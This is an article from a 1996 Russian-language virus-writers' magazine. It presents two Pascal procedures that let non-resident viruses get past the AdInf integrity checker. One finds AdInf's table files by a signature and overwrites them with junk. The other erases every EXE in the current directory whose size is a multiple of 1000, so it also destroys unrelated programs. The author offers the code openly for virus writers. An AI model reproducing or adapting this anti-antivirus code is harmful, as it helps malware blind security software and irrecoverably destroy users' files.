

      ▄▄                  █
     ▀▀▀  Virus Magazine  █ Box 10, Kiev 148, Ukraine       IV  1996
     ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  █▀▀▀▀▀▀█
      ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   █ █▀▀█ █
       █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     █ ▀▀▀█ █
       █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  █ █▄▄█ █
       ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  █▄▄▄▄▄▄█
       (C) Copyright, 1994-96, by STEALTH group WorldWide, unLtd.


──────────────────────────────────────────────────────────────────────────────


                                               Эпигpaф:
                                               Aбcoлютнo  cпoкoйны Bы
                                               мoжeтe быть, ecли eжe-
                                               днeвнo пoльзyeтecь pe-
                                               визopoм AdInf.

            Два пpocтых cпocoба oбoйти защиту AdInf'a на Паскале

     Пoльзoвaтeли ПK yвepeны в cтoпpoцeнтнoй гapaнтии  зaщиты  oт  виpycoв  пpи
иcпoльзoвaнии peвизopa AdInf. Дa, дeйcтвитeльнo,  пpи   мaлeйших  измeнeниях нa
диcкe, хapaктepных для пpoявлeния виpycoв (измeнeниe длин  иcпoлняeмых  фaйлoв,
измeнeниe MBR, нapyшeниe кoнтpoльнoй cyммы фaйлa etc.) AdInf тyт жe cooбщaeт oб
этoм пoльзoвaтeлю и пpeдoтвpaщaeт pacпpocтpaнeниe виpyca. Ho AdInf, кaк и любaя
дpyгaя пpoгpaммa, имeeт cвoи нeдocтaтки,  кoтopыe  мoгyт  быть  иcпoльзoвaны  в
бopьбe c ним.
     Резидентные вирусы могут скрываться от контроля AdInf'а лечением файлов,
открываемых AdInf'ом для проверки, обманывать AdInf, передавая ему информацию,
которую он хотел бы получить. Но как быть EXE-нерезиденту, написанному на
Паскале? Только что-то заразишь, как тут же AdInf кричит: "Ужас!!! На диске
обнаружены изменения файлов, характерные для проявления вирусов!!!" От этого
бедные юзеры и разрыв сердца могут получить. Гораздо лучше, когда AdInf
просто смолчит, или предложит пересоздать таблицы, объяснив свое желание
так, что и вирусу будет хорошо, и юзеру спокойно. Итак, проведенное
исследование показало:

     1) Cпocoб пoиcкa и yничтoжeния тaблиц AdInf'a.

     C кaждoй вepcиeй AdInf'a в  пpoгpaммy  дoбaвляeтcя  дoпoлнитeльнaя  зaщитa
тaблиц: вoзмoжнocть  нaзывaть  тaблицы  пpoизвoльным  имeнeм,  cнятиe  aтpибyтa
Hidden etc. Oднaкo oднa дeтaль ocтaeтcя нeизмeннoй: пo cмeщeнию 177 (в десятич-
ной системе счисления)  в  тaблицaх  нaхoдитcя  cлoвo  "Mocтoвoй".  Этим  мы  и
вocпoльзyeмcя для пoиcкa и yничтoжeния тaблиц.

     Для данного примера необходим модуль DOS.

 Procedure FuckTables;
 Const
      ID = 'Мостовой';    { Константа для сравнения }
 Var
    Sr    : SearchRec;
    F     : File;         { хэндл файла }
    FName : String;       { имя файла }
    Buf   : Array [1..8] Of Char; { буфер для считывания из файла }
    Attr  : Word;         { для сохранения атрибутов файла }
    Time  : LongInt;      { -//-//- времени файла }

 Procedure FindTables(Root : String); { параметр указывает, какой каталог }
                                      { проверять на наличие таблиц }
  Label Next;
  begin
      FindFirst(Root + '*.*' , AnyFile , Sr);
          While DosError = 0 Do
            begin
                FName:=Root + Sr.Name;
                If Sr.Size < 200 Then GoTo Next; { если размер < 200b - }
                                                 { переход на FindNext, }
                                                 { потому что явно не }
                                                 { таблица }
                If Sr.Attr <> $01 Then           { если атрибуты файла не }
                                                 { ReadOnly }
                If Sr.Attr <> $03 Then GoTo Next; { и не ReadOnly + Hidden, }
                                                  { значит, не таблица }
                Assign(F , FName);
                Attr:=Sr.Attr;          { сохраняем атрибуты }
                Time:=Sr.Time;          { и время файла }
                SetFAttr(F , Archive);  { устанавливаем Archive }
                Reset(F , 1);
                   Seek(F , 177);       { перемещаем указатель на 177 }
                                        { позицию файла }
                   BlockRead(F , Buf , 8); { считываем 8 символов в буфер }
                If Buf = ID Then        { если в буфере - "Мостовой", то }
                 begin
                   Seek(F , $1D0);
                   BlockWrite(F , Musor , 1000);
                 end;
                   Close(F);           { закрываем файл и }
                   SetFAttr(F , Attr); { восстанавливаем его атрибуты }
                   SetFTime(F , Time); { и время }
Next:
               FindNext(Sr);           { ищем следующий }
            end;
  end;         { конец процедуры FindTables }

 begin
       FindTables('\'); { ищем ОБЩИЕ таблицы в корне текущего диска }
       FindTables('');  { ищем ЛИЧНЫЕ таблицы в текущем каталоге }
 end;

     При нахождении таблиц AdInf'а эта процедура поверх оригинальной таблицы
записывает мусор из буфера. При следующем запуске AdInf сообщает, что "таблицы
созданы более поздней версией AdInf'а" (или "устаревший формат таблиц") и
предлагает пересоздать их. Причем в испорченной таблице остается paмoчкa,
гордо заверяющая пользователя, что таблица существует... ;)

     2) Способ поиска и уничтожения самой программы AdInf и его лечащего  моду-
        ля Adinf Cure Module

     Пользователь имеет возможность присвоить  программе  Adinf  и  Adinf  Cure
Module (AdInfExt) произвольное имя, защищая таким образом программу от вирусов,
уничтожающих программы с именем AdInf*.*. И все равно существует способ  поиска
и уничтожения этих программ. Длина программы AdInf и AdInfExt _любых_ версий (а
мне их встречалось 3 или 4) _всегда_ кратна 1000. Алгоритм поиска  таких  прог-
рамм выглядит следующим образом:

     Для этого примера также необходим модуль DOS.

 Procedure FuckAdinf;
 Label Next;
  Var
     Sr    : SearchRec;
     F     : File;         { хэндл файла }
     FName : String;       { имя файла }

  begin
      FindFirst('*.EXE' , AnyFile , Sr);
          While DosError = 0 Do
            begin
                FName:=Sr.Name;
                If (Sr.Size mod 1000) <> 0 Then GoTo Next;
                                            { если длина не кратна 1000 }
                                            { переход на FindNext }
                Assign(F , FName);
                SetFAttr(F , Archive);  { устанавливаем Archive }
                ReWrite(F);        { Открываем файл для записи, обнуляя его }
                Close(F);          { закрываем и }
                Erase(F);          { удаляем его с диска }
Next:
               FindNext(Sr);           { ищем следующий }
            end;
  end;

     Процедура FuckAdinf ищет в текущем каталоге файлы,  длины  которых  кратны
1000, и удаляет их с диска без возможности последующего восстановления.

     Вот, собственно, и все. Желаю, чтобы Ваши вирусы не обнаруживались 
AdInf'ом и не лечились его Cure Module, как не лечаться мои.

                                                            (c) Dirty Nazi 1996

P.S. Совсем недавно получил AdInf версии 10.07 - но некоммерческой версии. И
     оказалось, что длина некоммерческой версии не кратна 1000.  Но в неком-
     мерческой версии отключена куча функций, в том числе создание  протоко- 
     ла проверки и возможность лечения с  помощью  Cure Module. Так что 
     пользуйтесь коммерческой... :)